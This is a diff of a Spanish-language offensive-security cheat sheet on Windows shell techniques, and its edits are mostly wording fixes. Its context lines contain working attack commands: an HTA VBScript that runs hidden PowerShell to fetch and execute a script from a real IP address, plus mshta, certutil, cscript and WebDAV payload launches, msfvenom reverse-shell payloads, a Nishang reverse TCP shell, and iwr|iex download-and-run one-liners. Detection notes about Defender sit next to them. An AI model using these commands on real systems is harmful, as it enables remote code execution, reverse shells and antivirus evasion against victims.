@@ -125,7 +125,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Puedes descargar y ejecutar muy fácilmente un zombie Koadic usando el stager hta**
+**Puedes descargar y ejecutar muy fácilmente un zombi Koadic usando el stager hta**
 
 #### ejemplo de hta
 
@@ -280,7 +280,6 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **Detectado por el defensor**
 
-
 ## **Cscript/Wscript**
 ```bash
 powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
@@ -296,7 +295,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 Proceso realizando llamada de red: **svchost.exe**\
-Carga útil escrita en disco: **WebDAV client local cache**
+Carga útil escrita en disco: **caché local del cliente WebDAV**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -340,7 +339,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **No detectado**
 
-**Puedes descargar y ejecutar muy fácilmente un zombi Koadic usando el stager wmic**
+**Puedes descargar y ejecutar muy fácilmente un zombie Koadic usando el stager wmic**
 
 ## Msbuild
 
@@ -385,7 +384,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell Shells
+## Shells de Powershell
 
 ### PS-Nishang
 
@@ -395,7 +394,7 @@ En la carpeta **Shells**, hay muchas shells diferentes. Para descargar y ejecuta
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Comience a servir el script en un servidor web y ejecútelo en el extremo de la víctima:
+Inicie el servidor web para el script y ejecútelo en el extremo de la víctima:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -462,7 +461,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Más
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) consola PS con algunos módulos ofensivos de PS precargados (cifrados)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) consola PS con algunos módulos ofensivos de PS precargados (cifrado)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) consola PS con algunos módulos ofensivos de PS y detección de proxy (IEX)
 
